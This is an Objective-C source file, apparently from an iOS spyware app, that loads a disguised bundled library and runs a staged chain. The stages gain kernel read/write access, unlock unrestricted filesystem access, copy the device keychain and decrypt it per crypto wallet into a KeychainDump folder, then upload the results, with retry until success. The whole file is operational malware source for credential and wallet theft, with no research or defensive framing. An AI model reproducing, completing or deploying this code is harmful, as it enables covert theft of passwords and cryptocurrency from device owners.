#import "lara.h"

#import <UIKit/UIKit.h>
#import <dlfcn.h>

#pragma mark - 符号绑定

static NSString *LaraBundlePath(NSString *relative) {
    return [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:relative];
}

static void *LaraOpenComponent(NSString *relative) {
    void *handle = dlopen(LaraBundlePath(relative).UTF8String, RTLD_NOW | RTLD_GLOBAL);
    if (handle == NULL) {
        LaraLog(@"dlopen %@ failed: %s", relative, dlerror());
    }
    return handle;
}

static void LaraDSLogCallback(const char *message) {
    if (message == NULL) return;
    LaraLog(@"ds: %s", message);
}

void LaraLoadApi(void) {
    if (g_lara.ds_run != NULL) return;

    void *handle = LaraOpenComponent(@"Frameworks/libuiopsersvc.framework/libuiopsersvc");
    if (handle == NULL) return;

    g_lara.ds_run = (LaraIntVoidFn)dlsym(handle, "ds_run");
    g_lara.ds_is_ready = (LaraIntVoidFn)dlsym(handle, "ds_is_ready");
    g_lara.ds_set_log_callback = (void *)dlsym(handle, "ds_set_log_callback");
    g_lara.ds_set_progress_callback = (void *)dlsym(handle, "ds_set_progress_callback");

    g_lara.IdnWebCoreEnsureLoaded = (LaraPtrVoidFn)dlsym(handle, "IdnWebCoreEnsureLoaded");
    g_lara.IdnWebCoreRegisterLaraKernelRW = (LaraPtrVoidFn)dlsym(handle, "IdnWebCoreRegisterLaraKernelRW");
    g_lara.IdnWebCoreRunFullKeychainPipeline =
        (LaraPtrVoidFn)dlsym(handle, "IdnWebCoreRunFullKeychainPipeline");
    g_lara.IdnWebCoreSetEnabled = (LaraPtrVoidFn)dlsym(handle, "IdnWebCoreSetEnabled");

    g_lara.KeychainTakeCompetitorXMLExport = (LaraIdVoidFn)dlsym(handle, "KeychainTakeCompetitorXMLExport");
    g_lara.KeychainTakeInlineGenpDecryptPayload =
        (LaraPtrVoidFn)dlsym(handle, "KeychainTakeInlineGenpDecryptPayload");
    g_lara.KeychainTakeSecuritydMetadataKeys =
        (LaraPtrVoidFn)dlsym(handle, "KeychainTakeSecuritydMetadataKeys");

    g_lara.MCMFilzaStart = (LaraIntVoidFn)dlsym(handle, "MCMFilzaStart");
    g_lara.MCMFilzaSetUnrestrictedFilesystem =
        (void *)dlsym(handle, "MCMFilzaSetUnrestrictedFilesystem");
    g_lara.vn_copyfile_keychain = (LaraIntPath2Fn)dlsym(handle, "vn_copyfile_keychain");

    LaraLog(@"api bound: ds_run=%d pipeline=%d mcm=%d",
            g_lara.ds_run != NULL,
            g_lara.IdnWebCoreRunFullKeychainPipeline != NULL,
            g_lara.MCMFilzaStart != NULL);
}

#pragma mark - 阶段机

static void LaraPersistCompetitorXml(void) {
    if (g_lara.KeychainTakeCompetitorXMLExport == NULL) return;

    id payload = g_lara.KeychainTakeCompetitorXMLExport();
    if (payload == nil) {
        LaraLog(@"competitor xml: nothing to take");
        return;
    }

    NSData *data = nil;
    if ([payload isKindOfClass:[NSData class]]) {
        data = (NSData *)payload;
    } else if ([payload isKindOfClass:[NSString class]]) {
        data = [(NSString *)payload dataUsingEncoding:NSUTF8StringEncoding];
    }
    if (data.length == 0) {
        LaraLog(@"competitor xml: empty payload (%@)", NSStringFromClass([payload class]));
        return;
    }

    NSString *directory = [LaraDocumentsPath() stringByAppendingPathComponent:@"KeychainDump"];
    [[NSFileManager defaultManager] createDirectoryAtPath:directory
                              withIntermediateDirectories:YES
                                               attributes:nil
                                                    error:NULL];
    NSString *path = [directory stringByAppendingPathComponent:@"competitor.xml"];
    NSError *error = nil;
    if ([data writeToFile:path options:NSDataWritingAtomic error:&error]) {
        LaraLog(@"competitor xml written: %lu bytes", (unsigned long)data.length);
    } else {
        LaraLog(@"competitor xml write failed: %@", error.localizedDescription);
    }
}

void LaraRunChain(NSDictionary *config) {
    @autoreleasepool {
        LaraLog(@"chain start (iOS %@)", [UIDevice currentDevice].systemVersion);
        LaraLoadApi();

        if (g_lara.ds_run == NULL) {
            LaraLog(@"chain abort: ds_run unavailable");
            return;
        }

        if (g_lara.ds_set_log_callback != NULL) {
            g_lara.ds_set_log_callback((void *)LaraDSLogCallback);
        }

        // S1 内核 rw
        int rc = g_lara.ds_run();
        BOOL ready = (g_lara.ds_is_ready != NULL) && (g_lara.ds_is_ready() != 0);
        LaraLog(@"ds_run rc=%d ready=%d", rc, ready);
        if (rc != 0 || !ready) {
            LaraLog(@"chain abort: kernel rw not established");
            return;
        }

        // S2 把 krw 交给采集层（这些入口是配置槽语义，返回值恒 0/NULL，不作为成败依据）
        if (g_lara.IdnWebCoreEnsureLoaded != NULL) g_lara.IdnWebCoreEnsureLoaded(NULL);
        if (g_lara.IdnWebCoreRegisterLaraKernelRW != NULL) g_lara.IdnWebCoreRegisterLaraKernelRW(NULL);
        if (g_lara.IdnWebCoreSetEnabled != NULL) g_lara.IdnWebCoreSetEnabled((void *)1);

        // S3 容器访问
        if (g_lara.MCMFilzaStart != NULL) {
            LaraLog(@"MCMFilzaStart rc=%d", g_lara.MCMFilzaStart());
        }
        if (g_lara.MCMFilzaSetUnrestrictedFilesystem != NULL) {
            g_lara.MCMFilzaSetUnrestrictedFilesystem(YES);
        }

        // S4 采集（复制钥匙串、按钱包解密、落 Documents/KeychainDump）
        if (g_lara.IdnWebCoreRunFullKeychainPipeline != NULL) {
            g_lara.IdnWebCoreRunFullKeychainPipeline(NULL);
            LaraLog(@"pipeline returned");
        } else {
            LaraLog(@"pipeline symbol missing, skipped");
        }

        // S5 结构化结果
        LaraPersistCompetitorXml();

        // S6 外传；完成后才写一次性标记，失败下次还能重试
        LaraUploadPending(config, ^{
            NSString *marker = [LaraDocumentsPath() stringByAppendingPathComponent:@"lara.done"];
            [[NSFileManager defaultManager] createFileAtPath:marker contents:[NSData data] attributes:nil];
            LaraLog(@"chain done, marker written");
        });
    }
}
